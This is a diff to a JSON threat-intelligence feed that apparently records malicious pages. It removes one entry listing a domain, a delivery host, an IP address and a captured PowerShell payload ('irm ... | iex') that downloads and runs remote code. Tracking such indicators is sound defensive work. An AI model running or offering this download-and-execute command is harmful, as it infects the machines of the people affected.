@@ -17874,27 +17874,5 @@
     ],
     "ReportId": "cmwb2fd2s00g10nmllb1yc2q6",
     "ScannedAt": "2026-11-10T19:10:48.567000+00:00"
-  },
-  {
-    "UrlDomain": "dgzverandas.nl",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "46.202.158.31"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/fd9aaadbb95356a1",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/fd9aaadbb95356a1'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/fd9aaadbb95356a1"
-    ],
-    "ReportId": "cmwb12w7t00dj0nmlk3hyfwh0",
-    "ScannedAt": "2026-11-10T18:33:07.281000+00:00"
   }
 ]
